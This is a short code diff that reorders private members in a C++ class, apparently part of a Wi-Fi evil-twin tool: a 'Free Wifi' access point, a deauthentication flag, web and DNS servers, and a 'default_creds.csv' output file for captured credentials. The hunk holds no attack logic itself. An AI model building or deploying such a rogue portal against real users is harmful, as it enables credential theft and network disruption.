@@ -23,14 +23,14 @@ public:
     void loop(void);
 
 private:
+    String apName = "Free Wifi";
+    uint8_t _channel;
+    bool _deauth;
     WebServer webServer;
+
     DNSServer dnsServer;
     IPAddress apGateway;
 
-    uint8_t _channel;
-    bool _deauth;
-
-    String apName = "Free Wifi";
     String outputFile = "default_creds.csv";
     String htmlPage;
     String htmlFileName;
